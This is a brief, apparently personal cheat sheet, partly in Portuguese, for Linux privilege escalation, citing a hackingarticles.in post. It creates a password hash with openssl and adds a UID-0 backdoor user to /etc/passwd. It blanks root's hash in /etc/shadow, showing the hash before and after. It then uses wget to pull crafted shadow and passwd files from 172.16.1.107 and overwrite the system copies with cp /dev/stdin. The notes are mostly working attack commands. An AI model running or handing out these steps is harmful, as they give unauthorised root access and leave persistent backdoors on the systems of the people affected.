
`openssl passwd -1 -salt an4kein 1337`

`$1$an4kein$KpVTAUsL0SO0N532qSXyf.`

`an4kein:$1$an4kein$KpVTAUsL0SO0N532qSXyf.:0:0:/root/root:/bin/bash`


https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation/

1- Remova a senha crypt que existe no SHADOW

antes:
`root:$6$8uypxcySPhhZ/p1p$1Sj6Bbm/tTNOqdmjVWJh9KXH/osqfXi4WQfVkoSEgL5OSKGo7cxdbQRQo.yzibIddtabSHYvDs1IbITaGTd/o.::0:99999:7:::`

depos:
`root:::0:99999:7:::`


wget http://172.16.1.107:82/shadow -O shadow

wget http://172.16.1.107:82/passwd -O passwd


LFILE=/etc/shadow
echo "$(cat shadow)" | cp /dev/stdin "$LFILE"

LFILE=/etc/passwd
echo "$(cat passwd)" | cp /dev/stdin "$LFILE"
